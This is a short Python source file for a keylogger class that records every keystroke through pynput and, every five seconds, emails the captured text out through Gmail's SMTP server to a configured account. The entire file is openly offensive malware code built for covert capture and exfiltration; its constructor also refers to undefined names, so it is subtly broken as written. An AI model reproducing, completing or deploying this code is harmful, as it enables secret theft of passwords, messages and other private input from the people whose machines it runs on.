import pynput.keyboard
import threading
import smtplib
# stored_keys = ""


class Keylogger:
    
    def __init__(self):
        self.stored_keys = ""
        self.time = time
        self.email = email
        self.password = password
        
    def log(self,string):
        self.stored_keys = self.stored_keys + string
    
    def key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.log(current_key)
    
    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()        
    
    def report(self):
        self.send_mail(self.email,self.password,self.stored_keys)
        self.stored_keys = " "
        timer = threading.Timer(5,self.report)
        timer.start()
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener as Listener:
            self.report()
            Listener.join()